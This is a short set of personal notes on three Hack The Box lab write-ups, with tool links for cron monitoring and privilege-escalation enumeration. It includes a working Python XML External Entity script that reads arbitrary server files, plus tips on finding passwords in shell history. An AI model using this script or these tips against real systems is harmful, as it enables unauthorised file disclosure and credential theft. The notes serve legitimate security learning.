# HTB Writeup Notes

## Aragog Write-up (HTB)
https://medium.com/ctf-writeups/aragog-write-up-htb-b035a467773

Tool to monitor & interrupt cron jobs
https://github.com/DominicBreuker/pspy


## DevOops Write-up (HTB)
https://medium.com/ctf-writeups/devoops-writeup-fc6616a7239f

Python Script to generate XML External Entity Injection
```python
    import requests as rq
    import sys
    
    filename = sys.argv[1]
    url = "http://10.10.10.91:5000/upload"
    
    data = """<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://FD" >]>
    <Container>
    <Author></Author>
    <Subject></Subject>
    <Content>
        &xxe;
    </Content>
    </Container>
    """.replace("FD",filename)
    
    with open('payload.xml','w') as f:
        f.write(data)
    files = {'file':open('payload.xml','rb')}
    
    print("Attempting with file " + filename +" on url "+url+"\n#########")
    
    try:
        r = rq.post(url, files=files)
    except:
        print("No file found!")
        sys.exit()
    
    for count, i in enumerate(r.text.split('\n')[4:-4]):
        if count == 0: print(i.lstrip())
        else: print(i)
```

Check `.bashrc` for previous commands, might reveal passwords

LinEnum.sh - check for local privilege escalation abilities
https://github.com/rebootuser/LinEnum


## Waldo Write-up (HTB)
https://medium.com/ctf-writeups/waldo-write-up-htb-dfbaaaa91282

`find` command to list all files created by current user
`find / -user $USER ! -path "*proc*" ! -path "*var*" ! -path "*dev*" 2>/dev/null`

